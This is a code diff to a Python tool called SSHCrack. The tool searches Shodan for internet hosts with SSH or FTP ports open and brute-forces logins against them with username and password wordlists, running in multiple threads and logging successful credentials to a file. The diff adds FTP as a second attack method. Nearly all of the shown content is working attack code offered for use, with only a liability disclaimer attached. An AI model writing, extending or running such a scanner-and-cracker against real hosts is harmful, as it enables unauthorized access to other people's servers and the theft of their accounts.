@@ -11,6 +11,7 @@ import os
 import paramiko
 import sys
 import getopt
+import ftplib
 
 global api
 
@@ -24,17 +25,18 @@ def main(argv):
     apikey = "testing"
     target = ""
     iplist = ""
-    userlist = "wordlists\usernames.txt"
-    passlist = "wordlists\passwordlist.txt"
+    userlist = "wordlists\\usernames.txt"
+    passlist = "wordlists\\passwordlist.txt"
     users = []
     passwords = []
-    output = "output\output.txt"
+    attackmethod = "ssh"
+    output = "output\\output.txt"
     multi = 1
     xmode = False
     verbose = False
 
     try:
-        opts, args = getopt.getopt(argv, "hk:t:i:u:p:o:m:xv", ["help", "key=" "target=", "iplist=", "userlist=", "passlist=", "output=", "multi=", "verbose"])
+        opts, args = getopt.getopt(argv, "hk:t:i:u:p:a:o:m:xv", ["help", "key=" "target=", "iplist=", "userlist=", "passlist=", "attack=", "output=", "multi=", "verbose"])
     except getopt.GetoptError:
         print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
         print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
@@ -47,7 +49,7 @@ def main(argv):
         print("\033[0;31m       Disclaimer: Developers not liable or responsible")
         print("\033[0;31m       for misuse or damage caused by SSHCrack")
         print("\n")
-        print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
+        print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-a --attack <attack method>]\n[-o --output <output file name>] [-m --multi <thread number>] [-x] [-v --verbose]")
         print("\n")
         print("-h --help                     | Display help menu of arguments and command use")
         print("\n")
@@ -58,6 +60,7 @@ def main(argv):
         print("                              (default will be common default ssh logins)")
         print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
         print("                              (default will be common default ssh logins)")
+        print("-a --attack <attack method>   | Method of attack (ssh, ftp)")
         print("-o --output <filename>        | Specify the name of an output file for successful logins")
         print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
         print("-x                            | X mode - runs cracking on all searched IPs immediately")
@@ -78,7 +81,7 @@ def main(argv):
             print("\033[0;31m       Disclaimer: Developers not liable or responsible")
             print("\033[0;31m       for misuse or damage caused by SSHCrack")
             print("\n")
-            print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-o --output <output file name>]\n[-m --multi <thread number>] [-x] [-v --verbose]")
+            print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-a --attack <attack method>]\n[-o --output <output file name>] [-m --multi <thread number>] [-x] [-v --verbose]")
             print("\n")
             print("-h --help                     | Display help menu of arguments and command use")
             print("\n")
@@ -89,6 +92,7 @@ def main(argv):
             print("                              (default will be common default ssh logins)")
             print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
             print("                              (default will be common default ssh logins)")
+            print("-a --attack <attack method>   | Method of attack (ssh, ftp)")
             print("-o --output <filename>        | Specify the name of an output file for successful logins")
             print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
             print("-x                            | X mode - runs cracking on all searched IPs immediately")
@@ -109,6 +113,13 @@ def main(argv):
             userlist = arg
         elif opt in ("-p", "--passlist"):
             passlist = arg
+        elif opt in ("-a", "--attack"):
+            if arg.lower() in ["ssh", "ftp"]:
+                attackmethod = arg
+                print("Attack method " + arg + " chosen")
+            else:
+                print("Error: Invalid attack method")
+                sys.exit(2)
         elif opt in ("-o", "--output"):
             output = arg
         elif opt in ("-m", "--multi"):
@@ -157,7 +168,7 @@ def main(argv):
             print("Must specify a Shodan API key")
             sys.exit(2)
         else:
-            search(target, xmode)
+            search(attackmethod, target, xmode)
     elif target == "" and iplist == "":
         print("Must specify a target to search for or an IP address list")
         sys.exit(2)
@@ -165,18 +176,26 @@ def main(argv):
     print("IPs to be cracked: " + str(len(ips)))
 
     if multi > 1:
-        MultiThreading(multi, users, passwords, output, verbose)
+        MultiThreading(multi, users, passwords, attackmethod, output, verbose)
     else:
-        SSHConnect(multi, users, passwords, output, verbose)
+        if attackmethod == "ftp":
+            FTPConnect(multi, users, passwords, output, verbose)
+        else:
+            SSHConnect(multi, users, passwords, output, verbose)
 
-def search(target, xmode):
+def search(attackmethod, target, xmode):
+    print("Searching for " + target + " targets...")
     ipaddr = []
     try:
         results = api.search(target)
 
         print("Results found: {}".format(results["total"]))
         for result in results["matches"]:
-            if result["port"] == 22:
+            if attackmethod == "ssh" and result["port"] == 22:
+                ipaddr.append(result["ip_str"])
+                if xmode == True:
+                    ips.append (result["ip_str"])
+            elif attackmethod == "ftp" and result["port"] in [20, 21]:
                 ipaddr.append(result["ip_str"])
                 if xmode == True:
                     ips.append (result["ip_str"])
@@ -189,14 +208,17 @@ def search(target, xmode):
         print("Error: {}".format(error))
         sys.exit(2)
 
-def MultiThreading(multiNum, userList, passList, output, verbose):
+def MultiThreading(multiNum, userList, passList, attackmethod, output, verbose):
     try:
         x = list(divide_list(userList, multiNum))
         y = list(divide_list(passList, multiNum))
         for i in range(multiNum):
             if verbose:
                 print("Creating thread " + str(i))
-            threading.Thread(target=SSHConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
+            if attackmethod == "ftp":
+                threading.Thread(target=FTPConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
+            else:
+                threading.Thread(target=SSHConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
     except OSError as error:
         print("Error: {}".format(error))
 
@@ -215,9 +237,37 @@ def SSHConnect(multiNum, userList, passList, output, verbose):
                     print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
                 try:
                     client.connect(ip, user, password)
-                    print("SUCESS: " + user + "@" + user + " " + password)
+                    print("SUCESS <SSH>: " + user + "@" + user + " " + password)
+                    out.write("SSH>> " + ip + "@" + user + " " + password)
+                    out.write("\n")
                     client.close()
-                    out.write(ip + "@" + user + " " + password)
+                    breakout = True
+                    break
+                except:
+                    continue
+            if breakout:
+                break
+
+    print("\nThread cracking completed")
+    done_counter(multiNum)
+    sys.exit(0)
+
+def FTPConnect(multiNum, userList, passList, output, verbose):
+    out = open(output, "w")
+
+    for ip in ips:
+        breakout = False
+        for user in userList:
+            for password in passList:
+                if verbose:
+                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(ip, 21)
+                    ftp.login(user, password)
+                    print("SUCESS <FTP>: " + user + "@" + user + " " + password)
+                    ftp.quit()
+                    out.write("FTP>> " + ip + "@" + user + " " + password)
                     out.write("\n")
                     breakout = True
                     break
